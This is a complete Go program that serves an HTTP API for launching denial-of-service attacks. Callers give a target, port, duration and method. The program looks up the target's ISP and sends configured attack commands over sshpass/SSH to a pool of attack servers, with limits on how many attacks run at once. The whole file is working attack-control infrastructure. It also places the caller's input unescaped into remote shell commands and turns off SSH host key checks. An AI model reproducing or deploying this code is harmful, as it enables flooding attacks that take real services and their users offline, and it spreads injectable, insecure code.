package main

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/fsnotify/fsnotify"
)

type Server struct {
	Name     string `json:"name"`
	Host     string `json:"host"`
	User     string `json:"user"`
	Password string `json:"password"`
}

type GroupConfig struct {
	Servers              []string `json:"servers"`
	MaxConcurrentAttacks *int     `json:"maxConcurrentAttacks,omitempty"`
}

type MethodConfig struct {
	Command string `json:"command"`
	Group   string `json:"group"`
}

type IPInfo struct {
	Status string `json:"status"`
	ISP    string `json:"isp"`
	AS     string `json:"as"`
	Query  string `json:"query"`
}

type AttackResult struct {
	Status        string `json:"status"`
	ServerHost    string `json:"serverHost"`
	Message       string `json:"message"`
	Error         string `json:"error,omitempty"`
	CommandOutput string `json:"commandOutput,omitempty"`
}

type AttackSummary struct {
	Status          string         `json:"status"`
	Target          string         `json:"target"`
	Port            string         `json:"port"`
	Duration        string         `json:"duration"`
	Method          string         `json:"method"`
	ISPTarget       string         `json:"ISP target"`
	GlobalConsUsed  int            `json:"Global Cons used"`
	AttackGroupUsed string         `json:"Attack Group used"`
	Servers         []AttackResult `json:"servers"`
}

type Config struct {
	APIKey                     string                  `json:"apiKey"`
	Port                       string                  `json:"port"`
	ServePublic                bool                    `json:"servePublic"`
	GlobalMaxConcurrentAttacks int                     `json:"globalMaxConcurrentAttacks"`
	Servers                    []Server                `json:"servers"`
	Groups                     map[string]GroupConfig  `json:"groups"`
	Methods                    map[string]MethodConfig `json:"methods"`
}

var (
	config           Config
	configMutex      sync.RWMutex
	runningAttacks   = make(map[string]int)
	attackCountMutex sync.Mutex
)

func loadConfig(path string) (Config, error) {
	var newConfig Config
	bytes, err := os.ReadFile(path)
	if err != nil {
		return newConfig, fmt.Errorf("failed to read config file '%s': %w", path, err)
	}

	err = json.Unmarshal(bytes, &newConfig)
	if err != nil {
		return newConfig, fmt.Errorf("failed to parse config JSON: %w", err)
	}

	if newConfig.APIKey == "" {
		return newConfig, fmt.Errorf("apiKey must be set in config.json")
	}

	if len(newConfig.Servers) == 0 {
		return newConfig, fmt.Errorf("no servers found in config.json")
	}

	serverNames := make(map[string]bool)
	for _, s := range newConfig.Servers {
		if s.Name == "" {
			return newConfig, fmt.Errorf("a server is missing a 'name' in config.json")
		}
		if serverNames[s.Name] {
			return newConfig, fmt.Errorf("duplicate server name '%s' found in config.json", s.Name)
		}
		serverNames[s.Name] = true
	}
	for groupName, groupConf := range newConfig.Groups {
		for _, srvName := range groupConf.Servers {
			if !serverNames[srvName] {
				return newConfig, fmt.Errorf("server '%s' in group '%s' is not defined in the 'servers' list", srvName, groupName)
			}
		}
	}

	for methodName, methodConf := range newConfig.Methods {
		if methodConf.Command == "" {
			return newConfig, fmt.Errorf("method '%s' is missing a 'command'", methodName)
		}
		groupName := methodConf.Group
		if groupName != "" && !strings.EqualFold(groupName, "Global") {
			if _, ok := newConfig.Groups[groupName]; !ok {
				return newConfig, fmt.Errorf("group '%s' for method '%s' is not defined in the 'groups' list", groupName, methodName)
			}
		}
	}

	return newConfig, nil
}

func getIPInfo(ipOrDomain string) (IPInfo, error) {
	var info IPInfo
	ips, err := net.LookupIP(ipOrDomain)
	if err != nil {
		return info, fmt.Errorf("could not resolve IP for target '%s': %w", ipOrDomain, err)
	}
	if len(ips) == 0 {
		return info, fmt.Errorf("no IPs found for target '%s'", ipOrDomain)
	}
	targetIP := ips[0].String()

	resp, err := http.Get(fmt.Sprintf("http://ip-api.com/json/%s", targetIP))
	if err != nil {
		return info, fmt.Errorf("failed to get IP info: %w", err)
	}
	defer resp.Body.Close()

	if err := json.NewDecoder(resp.Body).Decode(&info); err != nil {
		return info, fmt.Errorf("failed to decode IP info response: %w", err)
	}

	if info.Status != "success" {
		return info, fmt.Errorf("IP info API returned status '%s' for query '%s'", info.Status, info.Query)
	}

	return info, nil
}

func writeJSONError(w http.ResponseWriter, message string, statusCode int) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(statusCode)
	json.NewEncoder(w).Encode(map[string]string{"error": message})
}

func logErrorToFile(serverHost, errorContent string) {
	if err := os.MkdirAll("err", 0755); err != nil {
		log.Printf("ERROR: Could not create error log directory: %v", err)
		return
	}

	timestamp := time.Now().Format("2006-01-02_15-04-05.000000")
	safeServerHost := strings.ReplaceAll(serverHost, ":", "_")
	fileName := fmt.Sprintf("err/%s_%s.log", safeServerHost, timestamp)

	logMessage := fmt.Sprintf("Timestamp: %s\nServer: %s\n---\n%s\n", time.Now().UTC().Format(time.RFC3339), serverHost, errorContent)

	if err := os.WriteFile(fileName, []byte(logMessage), 0644); err != nil {
		log.Printf("ERROR: Could not write to error log file %s: %v", fileName, err)
	}
}

func attackHandler(w http.ResponseWriter, r *http.Request) {
	query := r.URL.Query()
	apiKey := query.Get("auth")
	target := query.Get("target")
	port := query.Get("port")
	duration := query.Get("duration")
	method := query.Get("method")

	configMutex.RLock()
	defer configMutex.RUnlock()

	if apiKey != config.APIKey {
		writeJSONError(w, "Unauthorized: Invalid API key", http.StatusUnauthorized)
		log.Printf("Failed auth attempt from %s", r.RemoteAddr)
		return
	}
	if target == "" || port == "" || duration == "" || method == "" {
		writeJSONError(w, "Bad Request: Missing required parameters (target, port, duration, method)", http.StatusBadRequest)
		return
	}

	ipInfo, err := getIPInfo(target)
	var ipInfoStr, ispName string
	if err != nil {
		log.Printf("Warning: Could not get IP info for target '%s': %v", target, err)
		ipInfoStr = "Unavailable"
		ispName = "Unavailable"
	} else {
		ipInfoStr = fmt.Sprintf("ISP: %s, AS: %s", ipInfo.ISP, ipInfo.AS)
		ispName = ipInfo.ISP
	}
	methodConfig, ok := config.Methods[method]
	if !ok {
		writeJSONError(w, fmt.Sprintf("Bad Request: Method '%s' not found in configuration", method), http.StatusBadRequest)
		return
	}
	commandTemplate := methodConfig.Command
	group := methodConfig.Group
	if group == "" {
		group = "Global"
	}

	var globalTotal int
	attackCountMutex.Lock()
	maxSlots := config.GlobalMaxConcurrentAttacks
	if !strings.EqualFold(group, "Global") {
		if groupConf, ok := config.Groups[group]; ok && groupConf.MaxConcurrentAttacks != nil {
			maxSlots = *groupConf.MaxConcurrentAttacks
		}
	}

	currentSlots := runningAttacks[group]
	if maxSlots > 0 && currentSlots >= maxSlots {
		attackCountMutex.Unlock()
		msg := fmt.Sprintf("Max concurrent attacks for group '%s' reached (%d slots). Please try again later.", group, maxSlots)
		writeJSONError(w, msg, http.StatusTooManyRequests)
		return
	}
	runningAttacks[group]++

	for _, count := range runningAttacks {
		globalTotal += count
	}
	attackCountMutex.Unlock()

	defer func() {
		attackCountMutex.Lock()
		runningAttacks[group]--
		attackCountMutex.Unlock()
	}()

	screenName := ""
	if u, err := url.Parse(target); err == nil && u.Scheme != "" && u.Host != "" {
		reg := regexp.MustCompile("[^a-zA-Z0-9]+")
		screenName = reg.ReplaceAllString(u.Host, "")
	}

	var targetServers []Server
	dispatchGroupName := "Global"

	if group == "" || strings.EqualFold(group, "Global") {
		targetServers = config.Servers
	} else {
		dispatchGroupName = group
		groupConf, groupExists := config.Groups[group]
		if !groupExists {
			errMsg := fmt.Sprintf("Internal Server Error: Group '%s' for method '%s' not found. Check configuration.", group, method)
			log.Println(errMsg)
			writeJSONError(w, errMsg, http.StatusInternalServerError)
			return
		}

		serverMap := make(map[string]Server, len(config.Servers))
		for _, s := range config.Servers {
			serverMap[s.Name] = s
		}

		for _, name := range groupConf.Servers {
			if s, ok := serverMap[name]; ok {
				targetServers = append(targetServers, s)
			}
		}
	}

	if len(targetServers) == 0 {
		writeJSONError(w, fmt.Sprintf("No servers found for group '%s'", group), http.StatusBadRequest)
		return
	}

	replacer := strings.NewReplacer(
		"{target}", target,
		"{port}", port,
		"{duration}", duration,
		"{method}", method,
		"{screen_name}", screenName,
	)
	finalCommand := replacer.Replace(commandTemplate)

	var wg sync.WaitGroup
	results := make(chan AttackResult, len(targetServers))

	log.Printf("Dispatching command to %d servers in group '%s' for target %s", len(targetServers), dispatchGroupName, target)

	for _, server := range targetServers {
		wg.Add(1)
		go func(s Server) {
			defer wg.Done()
			log.Printf("Executing on server %s: %s", s.Host, finalCommand)

			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			defer cancel()

			cmd := exec.CommandContext(ctx, "sshpass", "-p", s.Password, "ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", fmt.Sprintf("%s@%s", s.User, s.Host), finalCommand)

			output, err := cmd.CombinedOutput()
			if err != nil {
				errorString := fmt.Sprintf("%v", err)
				fullErrorOutput := fmt.Sprintf("Error: %s\nOutput: %s", errorString, string(output))
				log.Printf("FAILED on %s: %s", s.Host, fullErrorOutput)

				logErrorToFile(s.Host, fullErrorOutput)

				results <- AttackResult{
					Status:        "FAILED",
					ServerHost:    s.Host,
					Message:       "Command execution failed.",
					Error:         errorString,
					CommandOutput: string(output),
				}
				return
			}
			successMsg := fmt.Sprintf("Attack sent to %s:%s for %ss via %s. Target Info: [%s].", target, port, duration, method, ipInfoStr)
			log.Printf("SUCCESS on %s. Output: %s", s.Host, string(output))
			results <- AttackResult{
				Status:     "SUCCESS",
				ServerHost: s.Host,
				Message:    successMsg,
			}
		}(server)
	}

	wg.Wait()
	close(results)

	var responseSummary []AttackResult
	for result := range results {
		responseSummary = append(responseSummary, result)
	}

	finalResponse := AttackSummary{
		Status:          "Attack Sent!",
		Target:          target,
		Port:            port,
		Duration:        duration,
		Method:          method,
		ISPTarget:       ispName,
		GlobalConsUsed:  globalTotal,
		AttackGroupUsed: group,
		Servers:         responseSummary,
	}

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	if err := json.NewEncoder(w).Encode(finalResponse); err != nil {
		log.Printf("ERROR: Failed to encode JSON response: %v", err)
	}
}

func reloadHandler(w http.ResponseWriter, r *http.Request) {
	apiKey := r.URL.Query().Get("auth")

	configMutex.RLock()
	currentAPIKey := config.APIKey
	configMutex.RUnlock()

	if apiKey != currentAPIKey {
		writeJSONError(w, "Unauthorized: Invalid API key", http.StatusUnauthorized)
		return
	}

	configMutex.Lock()
	defer configMutex.Unlock()

	newConfig, err := loadConfig("config.json")
	if err != nil {
		errMsg := fmt.Sprintf("Failed to reload config: %v", err)
		log.Println(errMsg)
		writeJSONError(w, errMsg, http.StatusInternalServerError)
		return
	}

	config = newConfig
	log.Println("Configuration reloaded successfully.")
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(map[string]string{"message": "Configuration reloaded successfully."})
}

func watchConfig(configPath string) {
	watcher, err := fsnotify.NewWatcher()
	if err != nil {
		log.Fatalf("FATAL: Failed to create file watcher: %v", err)
	}
	defer watcher.Close()

	err = watcher.Add(configPath)
	if err != nil {
		log.Fatalf("FATAL: Failed to add config file '%s' to watcher: %v", configPath, err)
	}

	log.Printf("Watching config file '%s' for changes...", configPath)

	for {
		select {
		case event, ok := <-watcher.Events:
			if !ok {
				return // Channel closed
			}
			// We are interested in Write events (file content changed)
			// or Create events (file might have been replaced/recreated by an editor)
			if event.Op&fsnotify.Write == fsnotify.Write || event.Op&fsnotify.Create == fsnotify.Create {
				log.Printf("Config file '%s' changed. Attempting to reload configuration...", event.Name)
				configMutex.Lock()
				newConfig, err := loadConfig(configPath)
				if err != nil {
					log.Printf("ERROR: Failed to automatically reload config: %v", err)
				} else {
					config = newConfig
					log.Println("Configuration automatically reloaded successfully.")
				}
				configMutex.Unlock()
			}
		case err, ok := <-watcher.Errors:
			if !ok {
				return // Channel closed
			}
			log.Printf("ERROR: File watcher error: %v", err)
		}
	}
}

func main() {
	initialConfig, err := loadConfig("config.json")
	if err != nil {
		log.Fatalf("FATAL: Could not load initial configuration. %v", err)
	}
	config = initialConfig

	if _, err := exec.LookPath("sshpass"); err != nil {
		log.Fatalf("FATAL: 'sshpass' is not installed or not in PATH. Please install it to continue.")
	}
	http.HandleFunc("/api/attack", attackHandler)
	http.HandleFunc("/api/reload", reloadHandler)

	// Start watching the config file in a goroutine
	go watchConfig("config.json")

	port := config.Port
	if port == "" {
		port = "8080"
		log.Printf("Warning: 'port' not specified in config.json, defaulting to %s", port)
	}

	listenHost := "localhost"
	if config.ServePublic {
		listenHost = "0.0.0.0"
	}

	fullAddr := fmt.Sprintf("%s:%s", listenHost, port)

	log.Printf("Starting API server on http://%s", fullAddr)
	log.Printf("Full credit goes to @mayshecry on github :) https://github.com/mayshecry thanks for using this api manager it means alot so please also star the repo")
	if err := http.ListenAndServe(fullAddr, nil); err != nil {
		log.Fatalf("Failed to start server: %v", err)
	}
}
